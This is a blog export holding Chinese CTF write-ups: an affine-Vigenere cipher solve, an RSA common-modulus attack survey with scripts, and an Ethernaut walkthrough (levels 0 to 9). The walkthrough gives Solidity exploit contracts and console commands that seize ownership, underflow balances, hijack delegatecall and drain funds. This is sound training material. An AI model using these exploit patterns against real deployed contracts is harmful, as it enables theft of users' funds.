<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XNUCA-baby_crypto]]></title>
    <url>%2F2019%2F01%2F12%2FXNUCA-baby-crypto%2F</url>
    <content type="text"><![CDATA[简介这道题是2018年XNUCA的一道密码题，当时由于自己比较菜没做出来，期末考试考完之后看书提到了重合指数破解Vigenere密码的内容，就想起来了这道题并开始复现一下。过程比较艰辛(自己太菜了),自闭了两三天终于弄出来了，也算是很开心，并于现在记录下来以备以后查看。 题目描述题目给的描述如下： The 26 letters a, b, c, …, y, z correspond to the integers 0, 1, 2, …, 25len(key_a) = mlen(key_k) = nc[i] = (p[i] * key_a[i % m] + key_k[i % n]) % 26 p is plain text, only lowercase letters are refered to.c is encrypted text I have appended the flag at the end of plain text, the format of which is like ‘flagis……’Now you have the encrypted text, Good luck! 并且题目给了encrypted_message，里面是大约1w多长度的密文，要求我们还原出来 解题思路首先我们要确定的是m和n多久循环一次，这里可以使用拟重合指数法确定。如果是Vigenere密码则是确定密钥长度。 12345678910111213141516171819202122232425262728#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength 确定的重合指数为6，则m和n的最小公因数就是6。之后我们可以将密文分为6组，分别统计每个字母的字频，以便接下来的分析 123456789101112131415#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency) 在字频中我们需要用到的有三个数据1.e的字频(大约在0.12左右)2.t的字频(大约在0.8左右)3.a的字频(大约在0.8左右)因为这三个字母的字频是最大且最容易区分(远大于其他字母)的，我们也就可以利用它们进行分析而在每个分组中我们都能找到和e,a,t三个字母相近频率的字母，我们可以将它们对应的位置保存下来以便接下来的使用。其中由于t和a的频率相近,所以我们会将它俩视作一起处理的数据 123e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2 其中位置指的是在字母表中的位置(a为0)，如e数组中的第一个元素8就代表字母表中的i，也就是在第一个分组中加密算法将字母e加密为了字母i 接下来我们可以通过题目给的加密运算式推出p[i]和key_k的表达式$$p[i] = ((c[i]-key_k[i \%n]) \times inv(key_a[i \%m])) mod (26)$$$$key_k[i \%n]] = (c[i]-(p[i] \times key_a[i \%m])) mod (26)$$其中inv(x)表示x的逆元我们接下来要对key_a和key_k进行爆破。其中两个数组都分别有6项，每一项的取值范围都在(0,25)之间，如果直接爆破，时间复杂度是特别大的但是由于key_a数组需要求逆元，所以我们便可以对key_a的取值范围进行缩小来减小复杂度。最终我们确定下来key_a的取值在(1,3,5,7,9,11,15,17,19,21,23,25)之中之后我们通过上面的公式将key_k算出来(其中通过我们频率统计中统计出的e的位置确定c[i]的取值),并通过a和t的位置验证key_k的取值是否成立，如果成立则根据此时的key_a和key_k数组解密密文,我们便可以寻找有意义的答案，从而得到flag1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res) 最终我们得到了flag 最终代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# -*- coding: utf-8 -*-# !/usr/bin/env pythonimport gmpy2e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency)#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res)if __name__ == '__main__': #这里输入的值不能完全读入，需要分两批读入并解密 Ciphertext = input("输入密文：").upper() Keylength = length(Ciphertext) print("密文的重合长度是",Keylength) #确定字频 frequency(Ciphertext) #爆破 brute(Ciphertext) 其中需要注意的是input的密文太长一次读不完，我们在找出key_a和key_k的解之后可以将密文分成两份分别解密]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA攻击综述]]></title>
    <url>%2F2019%2F01%2F09%2FRSA%E6%94%BB%E5%87%BB%E7%BB%BC%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[简介RSA作为密码学中的代表，就和web中的php一样，被许多人不断研究，才有着今天这样广泛的使用程度。当然与此相对的也有许多的攻击方式被不断挖掘出来。这篇文章主要是对现阶段主流的RSA攻击方式进行总结，并配上exp脚本，以备以后的使用。 基本解法首先介绍的是RSA通常解法，也就是已知p,q,e和ciphertext的时候求d和plaintext 脚本如下：12345678910111213141516171819202122# -*- coding: utf-8 -*-import gmpy2print "素数p："p = input ()print "素数q："q = input ()n = p*qprint "公钥e："e = input ()print "密文ciphertext："ciphertext = input ()# d=invert(e,φ(n))，可见invert()函数解决 ed ≡ 1 (mod φ(n)) 问题d=gmpy2.invert(e,(p-1)*(q-1))print "私钥d：",dplaintext=pow(ciphertext, d, n)print "明文：",plaintext 对模数n的因子分解分解模数n是最直接的攻击方法，将n分解之后得到p,q，再通过p,q,e计算得到d，最后用d和n以及ciphertext求解plaintext分解模数n可以通过yafu或者factordb网站在线分解，之后使用常规解法求解即可 公共模数攻击公共模数就是指用相同的n加密同一段密文，这样做是十分危险的，因为我们可以利用数学推导绕过d直接得到明文。具体的推导如下：我们假设m为信息明文，两个加密公钥分别为e1和e2，公共模数是n，则有$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 因为e1与e2互质，故我们用欧几里得算法能够找到s1和s2满足下面的关系$$e_1^{s1}+e_2^{s2}=1$$ 式中的s1和s2皆为整数，但是一正一负。我们假设s1为正数，s2为负数因为$$C_1\equiv m^{e1} mod(n)$$$$C_2\equiv m^{e2} mod(n)$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1} mod(n))^{s1}\times (m^{e2} mod(n))^{s2}) mod(n)$$ 根据模运算性质，可以化简为$$(C_1^{s1}\times C_2^{s2}) mod(n) = ((m^{e1})^{s1}\times (m^{e2})^{s2}) mod(n)$$ 即$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^{e1^{s1}+e2^{s2}}) mod(n)$$ 又因为前面提到过$$e_1^{s1}+e_2^{s2}=1$$ 所以$$(C_1^{s1}\times C_2^{s2}) mod(n) = (m^1) mod(n)$$ 即$$C_1^{s1}\times C_2^{s2} = m$$ 这样我们就可以通过c1,c2,e1和e2得到密文了脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546from gmpy2 import invert#可以使用libnum包中的n2s或者自己写一个#from libnum import n2sdef n2s(num): t = hex(num)[2:] if len(t) % 2 == 1: return ('0'+t).decode('hex') return t.decode('hex')#欧几里得算法def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)if __name__ == '__main__': print "模数n：" n = input () print "密文C1：" c1 = input () print "密文C2：" c2 = input () print "公钥e1：" e1 = input () print "公钥e2：" e2 = input () s = egcd(e1, e2) s1 = s[1] s2 = s[2] #求模反元素 if s1&lt;0: s1 = - s1 c1 = invert(c1, n) elif s2&lt;0: s2 = - s2 c2 = invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n print n2s(m)]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ethernaut训练]]></title>
    <url>%2F2019%2F01%2F08%2Fethernautd%E8%AE%AD%E7%BB%83%2F</url>
    <content type="text"><![CDATA[简介ethernaut包含有22道智能合约的训练题目，而最近有关智能合约的题也是在不断的出现，所以还是有必要了解一下的(顺便了解下这种题目怎么做) 题目链接 另外也放上大哥的writeup跟着学习一下链接 level 0 - Hello Ethernaut题目链接 第一步首先是简单的教程，先下载MetaMask插件并且注册账号，然后设置钱包并使用Ropsten测试网络 第二步打开控制台，然后会发现给了合约地址和help 其中level地址为 0xdf51a9e8ce57e7787e4a27dd19880fd7106b9a5c在Ropsten测试网络下还会有你的player地址和Ethernaut地址使用player指令可以直接获得player地址 第三步之后会让你使用getBalance函数获得你的以太坊的数量，并且让你使用help(),由于我们第二步使用过，就不再演示了PS:由于在Ropsten测试网络中可以直接通过Ether Faucet获得测试以太坊，所以我的数额为7 第四步使用ethernaut指令可以直接输出当前合约的有关信息，其中的abi可以理解为合约中的公共方法列表，当然在下面可以看见例如owner: f()之类的东西就是方法的具体信息 第五步与ABI互动，也就是可以调用上一步说的方法列表里的方法，系统让我们调用ethernaut.owner()，返回的是智能合约的拥有者 第六步这一步就是让我们通过上面提到的Ether Faucet获得测试以太坊，可以将MetaMask调至中文，然后点击存入-测试水管，之后点击request 1 ether from faucet就行 第七步生成合约实例，点击下面的蓝色按钮即可，需要等待一段时间 成功之后会显示下图 第八步题目告诉你生成的合约实例可以调用合约的ABI，也可以自己试试，用contract.方法就行 第九步从contract.info()入手跟着走下去就行 之后点击submit instance即可过关。 通关后的彩蛋 Congratulations! You have completed the tutorial. Have a look at the Solidity code for the contract you just interacted with below.You are now ready to complete all the levels of the game, and as of now, you’re on your own.Godspeed!! level 1 - Fallback题目链接 胜利条件1.获得合约的所有权2.收回合约的所有余额 tips1.如何用ABI发送ether2.如何用ABI以外的方法发送ether3.查看help()会有帮助4.Fallback方法 源码123456789101112131415161718192021222324252627282930313233pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallback is Ownable &#123; mapping(address =&gt; uint) public contributions; function Fallback() public &#123; //构造函数，初始化owner的contributions为1000 contributions[msg.sender] = 1000 * (1 ether); &#125; function contribute() public payable &#123; //将合约拥有权交给贡献1000ETH以上的人 require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; //查询contribution return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; //owner收回合约的所有余额，只有owner可以调用 owner.transfer(this.balance); &#125; function() payable public &#123; //fallback函数，当满足发送的value大于1并且发送者的contributions的值大于1时将owner变为消息发送者 require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 预备知识回退函数(fallback function)1.每一个合约有且仅有一个没有名字的函数。这个函数无参数，也无返回值。如果调用合约时，没有匹配上任何一个函数(或者没有传哪怕一点数据)，就会调用默认的回退函数。 2.此外，当合约收到ether时（没有任何其它数据），这个函数也会被执行。向合约发送 send、transfer、call 消息时候都会调用 fallback 函数，不同的是 send 和 transfer 有 2300 gas 的限制，也就是传递给 fallback 的只有 2300 gas，这个 gas 只能用于记录日志，因为其他操作都将超过 2300 gas。但 call 则会把剩余的所有 gas 都给 fallback 函数，这有可能导致循环调用。 我们在这里要用到的就是第二点 解题思路最终目的是调用withdraw()方法将余额清零，也就是我们要成为ownercontribute里面虽然有可能称为owner，但是代价太过昂贵（1000ETH且每次只能发送小于0.001的ETH）在fallback中只要满足msg.value&gt;0且contributions[msg.sender]&gt;0即可成为owner其中msg.value我们可以直接发送过去，而contributions[msg.sender]我们需要调用contribute()这个函数，也就是参数满足value&lt;0.001的条件就行 具体步骤1.调用contribute函数，传入参数value=1其中value的单位是wei 11 eth = 1e9 Gwei = 1e18 wei 2.调用send函数，传入参数1(也可以在钱包里直接打钱，不过听说打钱会有bug，就直接用send了，当然也可以用contract.sendTransaction({value: 100}))， 由于send函数会调用fallback函数，我们便成为了owner 3.调用withdraw函数，将钱卷走 4.点击submit instance即可过关。 注意事项绝对不要操作太快了，每一步传值的时候都要等到右下弹出提示再继续,否则可能和我一样一个账号40多条操作在排队，过了一个小时都没反应,只能再开一个账号(:зゝ∠) 通关后的彩蛋 You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.You’ve also learnt about OpenZeppelin’s Ownable contract, and how it can be used to restrict the usage of some methods to a priviledged address.Move on to the next level when you’re ready! level 2 - Fallout题目链接 胜利条件1.获得合约的所有权 tips1.Solidity Remix IDE 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract Fallout is Ownable &#123; mapping (address =&gt; uint) allocations; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; function allocate() public payable &#123; allocations[msg.sender] += msg.value; &#125; function sendAllocation(address allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(this.balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 解题思路可以看出函数的构造函数写错了，Fallout写成了Fal1out，变为了谁都可以调用的函数(我们无法调用构造函数)。所以我们可以调用构造函数成为owner，然后再调用collectAllocations取钱 具体步骤1.调用Fal1out函数，成为owner 2.调用collectAllocations函数，将钱卷走 3.点击submit instance即可过关。 通关后的彩蛋 That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?Well… Not quite.The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:12345&gt; contract Rubixi &#123;&gt; address private owner;&gt; function DynamicPyramid() &#123; owner = msg.sender; &#125;&gt; function collectAllFees() &#123; owner.transfer(this.balance) &#125;&gt; ... This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smartcontractland. level 3 - Coin Flip题目链接 胜利条件1.猜抛硬币的结果，连续猜对十次即可获胜 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125; 预备知识1.revert()这行代码：if(msg.sender != owner) { throw; }完全等价于如下三种形式：if(msg.sender != owner) { revert(); }assert(msg.sender == owner);require(msg.sender == owner); 解题思路1.从随机数逻辑生成来看，主要有三个步骤&nbsp;&nbsp;&nbsp;&nbsp;a.获取上一个块的hash&nbsp;&nbsp;&nbsp;&nbsp;b.判断hash是否和上一次的hash相同，相同则回退&nbsp;&nbsp;&nbsp;&nbsp;c.根据blockValue/FACTOR的结果判断硬币正负 2.我们每次产生的随机数和前一块的hash有关，只需要编写合约进行同步计算即可 具体步骤1.编写exp合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pragma solidity ^0.4.18;contract CoinFlip &#123; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; function CoinFlip() public &#123; consecutiveWins = 0; &#125; function flip(bool _guess) public returns (bool) &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; if (side == _guess) &#123; consecutiveWins++; return true; &#125; else &#123; consecutiveWins = 0; return false; &#125; &#125;&#125;contract exp&#123; CoinFlip C; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 function setCoinflip(address _addr) public &#123; C = CoinFlip(_addr); &#125; function hack() public OwnerOnly &#123; uint256 blockValue = uint256(block.blockhash(block.number-1)); if (lastHash == blockValue) &#123; revert(); &#125; lastHash = blockValue; uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; C.flip(side); &#125;&#125; 2.部署在remix上并运行hack方法十次 3.通过命令contract.consecutiveWins()可查询猜对的次数 4.当猜对的次数为10次以上之后，点击submit instance即可过关。 通关后的彩蛋 Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor. Some options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize). level 4- Telephone题目链接 胜利条件1.获得合约的所有权 tips1.See the Help page above, section &quot;Beyond the console&quot;,这一节主要就是教你可以使用Remix和Truffle进行合约编写和attack，也就是我们所说的写exp并运行。 源码12345678910111213141516pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125; 预备知识1.tx.origin 全局变量，也就是合约的owner 解题思路1.我们可以编写代码调用changeOwner，传入我们的地址，就可以变成合约owner了 具体步骤1.编写exp合约123456789101112131415161718192021222324252627pragma solidity ^0.4.18;contract Telephone &#123; address public owner; function Telephone() public &#123; owner = msg.sender; &#125; function changeOwner(address _owner) public &#123; //如果消息发送者不是owner就将owner转移给_owner if (tx.origin != msg.sender) &#123; owner = _owner; &#125; &#125;&#125;contract exp&#123; Telephone tel; function setAttackAddr(address _addr)&#123; tel = Telephone(_addr); &#125; function attack(address _addr)&#123; tel.changeOwner(_addr); &#125;&#125; 2.获取合约地址和我们自己的用户地址，并查询合约拥有者 3.进行攻击 4.再次查询合约拥有者，发现变成了我们，攻击完毕 5.点击submit instance即可过关。 通关后的彩蛋 While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as this.An example of a possible attack is outlined below.1.Use tx.origin to determine whose tokens to transfer, e.g.1234&gt; function transfer(address _to, uint _value) &#123;&gt; tokens[tx.origin] -= _value;&gt; tokens[_to] += _value;&gt; &#125; 2.Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.123&gt; function () payable &#123;&gt; token.transfer(attackerAddress, 10000);&gt; &#125; In this scenario, tx.origin will be the victim’s address (while msg.sender will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker. level 5- Token题目链接 胜利条件1.攻击Token代币合约2.开始时会获取20个代币，我们需要获得额外的、大量的代币 tips1.odometer 源码12345678910111213141516171819202122pragma solidity ^0.4.18;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; function Token(uint _initialSupply) public &#123; //初始化代币给owner balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; //将msg.sender的value个代币转给_to，并且msg.sender-value的值大于0 require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; //查询代币数量 return balances[_owner]; &#125;&#125; 解题思路1.从transfer函数可以看出是很明显的整数溢出漏洞，转给别的地址大于20个代币即可 具体步骤1.初始化信息 2.进行转账操作，随便填一个地址，然后查询我们和转账地址的代币数，发现已经溢出 3.点击submit instance即可过关。 通关后的彩蛋 Overflows are very common in solidity and must be checked for with control statements such as:123&gt; if(a + c &gt; a) &#123;&gt; a = a + c;&gt; &#125; An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:1&gt; a = a.add(c); If there is an overflow, the code will revert. level 6- Delegation题目链接 胜利条件1.获得合约的所有权 tips1.查看Solidity文档中关于delegatecall low level function的内容2.Fallback方法3.Method ids 源码12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.18;contract Delegate &#123; address public owner; function Delegate(address _owner) public &#123; owner = _owner; &#125; function pwn() public &#123; owner = msg.sender; &#125;&#125;contract Delegation &#123; address public owner; Delegate delegate; function Delegation(address _delegateAddress) public &#123; //初始化 delegate = Delegate(_delegateAddress); owner = msg.sender; &#125; function() public &#123; //FallBack函数 if(delegate.delegatecall(msg.data)) &#123; //执行参数为data的delegatecall this; &#125; &#125;&#125; 预备知识1.delegatecall简单来说就是delegatecall执行别的合约的方法的时候的作用域是调用合约的环境。比如别的合约的方法修改了它的第一个参数b，调用合约通过delegatecall调用该方法时，会把调用合约的第一个参数给修改掉(并且哪怕名字不一样也可以)具体内容可以参考这篇文章，写的挺详细的链接 解题思路1.首先我们的目的是通过delegatecall来执行Delegate合约中的pwn方法，进而通过delegatecall的漏洞来改变Delegation合约的owner，也就是改成我们。2.为了执行delegatecall，我们需要执行fallback函数，传入的data参数应该为pwn()的函数id，即其函数签名的sha3的前4个bytes(也就是4*2+2(0x)=10位) 具体步骤1.初始化实例并查看合约的owner 2.构造exp并执行contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)}).完毕之后查看owner，发现已经变成我们 3.点击submit instance即可过关。 通关后的彩蛋 Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care. Please refer to the The Parity Wallet Hack Explained article for an accurate explanation of how this idea was used to steal 30M USD. level 7- Force题目链接 胜利条件1.让合约的balance&gt;0 tips1.Fallback方法2.用其他合约去攻击这个合约3.用Remix或Truffle 源码1234567891011pragma solidity ^0.4.18;contract Force &#123;/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m)*/&#125; 预备知识1.selfdestruct函数(析构函数)selfdestruct(address)会将当前合约的余额发送至address。 2.没有fallback函数如何往合约里打钱？当合约没有实现payable fallback函数的时候，依然有两种方法给合约里打钱&nbsp;&nbsp;&nbsp;&nbsp;a.将合约作为挖矿地址挖矿&nbsp;&nbsp;&nbsp;&nbsp;b.调用其他合约的析构函数selfdestruct并将此合约的地址作为参数 解题思路1.我们自己编写一个合约并约束一个方法为payable，并通过该方法向此合约中打钱。2.调用此合约的selfdestruct函数，将目标合约地址作为参数传入。这样此合约的剩下的钱就会被转移过去。 具体步骤1.编写exp合约12345678910contract exp&#123; address attackAddr; function init(address _addr) public payable&#123; attackAddr=_addr; &#125; function attack()&#123; selfdestruct(attackAddr); &#125;&#125; 2.先调用init函数设置攻击合约的地址，并附加上一定数额的ETH 3.再调用attack函数进行转钱 3.点击submit instance即可过关。 通关后的彩蛋 In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant this.balance == 0 for any contract logic. level 8- Vault题目链接 胜利条件1.获得password并调用unlock函数使得locked参数变为false 源码1234567891011121314151617pragma solidity ^0.4.18;contract Vault &#123; bool public locked; bytes32 private password; function Vault(bytes32 _password) public &#123; locked = true; password = _password; &#125; function unlock(bytes32 _password) public &#123; if (password == _password) &#123; locked = false; &#125; &#125;&#125; 预备知识1.在区块链上所有的块以及信息都是公开的，所以即使合约中使用了private，该信息依然是公开的，可以随时被别人查看。 解题思路1.通过读取区块链上的块中的信息获取password2.用该password作为参数调用unlock函数进行解锁 具体步骤1.通过web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))指令查看password 2.将password传入unlock函数 3.点击submit instance即可过关。 通关后的彩蛋 It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter. level 9- King题目链接 胜利条件1.你可以通过打钱成为新的King，当然前提是你的前比上一个King的钱多2.当你点击Submit的时候合约会重新变为King，你要想办法去保持King位 源码123456789101112131415161718192021pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract King is Ownable &#123; address public king; uint public prize; function King() public payable &#123; king = msg.sender; prize = msg.value; &#125; function() external payable &#123; //打更多的钱或者合约owner都可以调用此方法变为king require(msg.value &gt;= prize || msg.sender == owner); king.transfer(msg.value); king = msg.sender; prize = msg.value; &#125;&#125; 预备知识1.Solidity 中几种转币方式。 &lt;address&gt;.transfer()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会 throw; 回滚状态&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.send()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy） &lt;address&gt;.call.value()()&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false&nbsp;&nbsp;&nbsp;&nbsp;传递所有可用 Gas 